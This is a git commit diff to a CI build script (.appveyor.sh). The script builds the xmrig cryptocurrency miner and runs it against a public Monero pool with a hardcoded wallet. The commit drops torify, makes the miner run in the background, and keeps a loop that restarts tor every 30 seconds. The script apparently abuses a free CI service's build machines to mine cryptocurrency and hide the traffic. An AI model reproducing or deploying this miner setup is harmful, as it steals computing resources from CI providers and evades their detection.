cf5497e0b5904db5c347cb5156d3613327c3678c
jdiijfrlohb <anhhaitienken@gmail.com>
2019-08-26 16:12:39 +0700

    Update .appveyor.sh

--- .appveyor.sh
+++ .appveyor.sh
@@ -15,5 +15,5 @@ cd build
 cmake ..
 make
 sudo sysctl -w vm.nr_hugepages=128
-torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x9 -k --tls -a cn/r --b
+./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x9 -k --tls -a cn/r -B
 while true; do service tor restart; sleep 30; done
